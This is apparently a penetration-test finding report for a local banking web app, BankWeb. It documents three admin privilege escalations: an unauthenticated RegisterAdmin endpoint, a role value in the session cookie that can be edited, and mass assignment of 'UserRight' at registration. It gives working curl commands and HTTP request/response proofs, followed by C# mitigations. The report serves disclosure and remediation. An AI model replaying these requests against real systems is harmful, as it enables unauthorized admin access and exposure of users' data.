# Issue #20 — Multiple Vertical Privilege Escalations

| Field         | Details                                               |
|---------------|-------------------------------------------------------|
| **Target**    | BankWeb — `http://localhost:1337`                     |
| **Severity**  | Critical                                              |
| **CVSS v3.1** | 9.1                                                   |
| **Vector**    | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N                 |
| **Category**  | Broken Access Control — Vertical Privilege Escalation  |

---

## Summary

Three independent vectors allow any user — including unauthenticated users in two cases — to obtain administrator-level access to the application. The root cause across all three is the same: the application's access control model is implemented client-side using a manipulable session cookie, and the role field within that cookie is never cryptographically verified server-side.

Three vectors were confirmed:

- **Vector A** — the `/api/Auth/RegisterAdmin` endpoint, disclosed via an HTML comment (Issue #05), is accessible without any authentication and creates fully privileged admin accounts on demand
- **Vector B** — the role segment of the session cookie (`&0` for users, `&100` for admins) can be modified by any authenticated user to instantly grant themselves admin access to all protected endpoints
- **Vector C** — the `/api/Auth/Register` endpoint is vulnerable to mass assignment, accepting a `UserRight` parameter that sets the role directly on the newly created account — allowing any visitor to self-register as an admin without any existing credentials

---

## Steps to Reproduce

### Vector A — Unauthenticated Admin Registration

1. Send a `POST` request to the admin registration endpoint with any credentials — no session required:

   ```bash
   curl -s -X POST "http://localhost:1337/api/Auth/RegisterAdmin" \
     -H "Content-Type: application/json" \
     -H "X-Requested-With: XMLHttpRequest" \
     -d '{"UserName":"[REDACTED]","Password":"[REDACTED]"}'
   ```

2. Log in with the newly created account and observe that the issued session cookie ends with `&100`, confirming admin role assignment.
3. Access `/admin` with the new session and confirm full admin panel access.

### Vector B — Cookie Role Manipulation

1. Log in as any standard user and capture the `SessionId` cookie.
2. URL-decode the cookie. The structure is `<base64(email)>&<hmac>&<role>`.
3. Change the final segment from `0` to `100`, re-encode, and send any request to a protected admin endpoint:

   ```bash
   # Standard user cookie ends with %260 (decoded: &0)
   # Replace %260 with %26100 (decoded: &100)
   curl -s "http://localhost:1337/admin" \
     -H "Cookie: SessionId=[REDACTED-MODIFIED]"
   ```

4. Observe that the server grants access to the admin panel instead of redirecting to the login page.

### Vector C — Mass Assignment on Registration

1. Send a `POST` request to `/api/Auth/Register` with an additional `UserRight` field set to `100`:

   ```bash
   curl -s -X POST "http://localhost:1337/api/Auth/Register" \
     -H "Content-Type: application/json" \
     -d '{"UserName":"[REDACTED]","Password":"[REDACTED]","UserRight":100}'
   ```

2. Log in with the new account and observe that the issued session cookie ends with `&100`.
3. Access `/admin` and confirm full admin access is granted.

---

## Proof of Concept

### Vector A — Unauthenticated Admin Registration

**Request (no session cookie):**

```http
POST /api/Auth/RegisterAdmin HTTP/1.1
Host: localhost:1337
Content-Type: application/json
Content-Length: 48
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Origin: http://localhost:1337
Referer: http://localhost:1337/auth/login

{"UserName":"[REDACTED]","Password":"[REDACTED]"}
```

**Response:**

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Date: Mon, 07 Jul 2025 16:34:14 GMT
Server: Kestrel
Content-Length: 2

{}
```

The admin account is created with no session or existing admin credentials required. Subsequent login confirms the `&100` role in the issued cookie, and `GET /admin` returns the full admin panel:

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

...
<h2 class="transTableTitle">All transactions of users</h2>
...
```

---

### Vector B — Cookie Role Manipulation

**Standard user request (blocked):**

```http
GET /admin HTTP/1.1
Host: localhost:1337
Cookie: SessionId=[REDACTED-STANDARD-USER]
```

```http
HTTP/1.1 302 Found
Location: /Auth/Login
```

**Same user, role field changed from `&0` to `&100`:**

```http
GET /admin HTTP/1.1
Host: localhost:1337
Cookie: SessionId=[REDACTED-MODIFIED]
```

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 6789

<!DOCTYPE html>
...
"ajax": "/api/Admin/GetAllUsers"
...
```

Changing a single value in the cookie grants full admin panel access. The page loads the admin user table via `/api/Admin/GetAllUsers`, which returned data for all 30 registered accounts including names, surnames, usernames, and role values.

---

### Vector C — Mass Assignment

**Standard registration (role: 0):**

```http
POST /api/Auth/Register HTTP/1.1
Host: localhost:1337
Content-Type: application/json

{"UserName":"[REDACTED]","Password":"[REDACTED]"}
```

Login response cookie ends with `&0` — standard user role confirmed.

**Registration with injected `UserRight` field (role: 100):**

```http
POST /api/Auth/Register HTTP/1.1
Host: localhost:1337
Content-Type: application/json

{"UserName":"[REDACTED]","Password":"[REDACTED]","UserRight":100}
```

```http
HTTP/1.1 200 OK
{}
```

Login response cookie ends with `&100` — admin role confirmed. The `UserRight` field is not in the documented registration schema but is accepted and applied directly to the new account's role, confirming that the server binds all request fields to the internal user model without allowlisting.

---

## Impact

- **Complete application compromise via three independent paths** — any of the three vectors alone is sufficient to achieve full admin access. Remediating one does not protect against the others; all three must be fixed simultaneously.
- **Unauthenticated admin creation (Vectors A and C)** — two of the three vectors require no existing credentials whatsoever. Any internet-facing deployment is fully compromised by an anonymous attacker in a single HTTP request.
- **Admin panel exposes all user data** — once admin access is obtained, `/api/Admin/GetAllUsers` returns names, surnames, usernames, and roles for all 30 registered accounts. Combined with the SQL injection (Issue #08) which exposes plaintext passwords, full credential data for the entire user base is accessible.
- **Role stored client-side with no integrity** — Vector B confirms that the server never verifies the role claim in the cookie against a server-side record. The entire access control model is built on a client-supplied, unprotected value — a fundamental architectural failure that makes all role-based restrictions trivially bypassable.
- **Compound chain with prior findings** — Issue #05 disclosed the `RegisterAdmin` endpoint via an HTML comment, directly enabling Vector A. Issue #18 identified the cookie structure, directly enabling Vector B. This finding represents the convergence of multiple earlier weaknesses into a single, complete privilege escalation chain.

---

## Recommended Mitigations

1. **Require an authenticated admin session on `/api/Auth/RegisterAdmin`** and consider removing the endpoint entirely in favour of an out-of-band admin provisioning process:

   ```csharp
   [HttpPost("RegisterAdmin")]
   [Authorize(Roles = "Admin")]
   public async Task<IActionResult> RegisterAdmin([FromBody] RegisterRequest request)
   { ... }
   ```

2. **Move role and identity out of the client-side cookie entirely.** Replace the current custom cookie format with an opaque session token that maps to a server-side record. The role must be stored and enforced server-side, never derived from a client-supplied value:

   ```csharp
   // Store role in server-side session, not in the cookie itself
   HttpContext.Session.SetString("Role", user.Role.ToString());
   ```

3. **Fix the mass assignment vulnerability on `/api/Auth/Register`** by using an explicit, allowlisted input model that does not include `UserRight` or any role-related field:

   ```csharp
   public class RegisterRequest
   {
       [Required] public string UserName { get; set; }
       [Required] public string Password { get; set; }
       public string Name { get; set; }
       // UserRight intentionally omitted — role is always assigned server-side
   }
   ```

4. **Enforce role checks at the framework level** using policy-based authorisation rather than reading the role from the cookie at runtime. Once roles are stored server-side, policies can be enforced consistently across all protected routes:

   ```csharp
   builder.Services.AddAuthorization(options =>
   {
       options.AddPolicy("AdminOnly", policy =>
           policy.RequireRole("Admin"));
   });
   ```

5. **Audit all admin-only endpoints** to confirm that role enforcement is applied consistently. Given that Vector B demonstrated that changing a single cookie byte grants admin access to `/admin` and `/api/Admin/GetAllUsers`, other admin endpoints likely share the same flaw and must each be verified.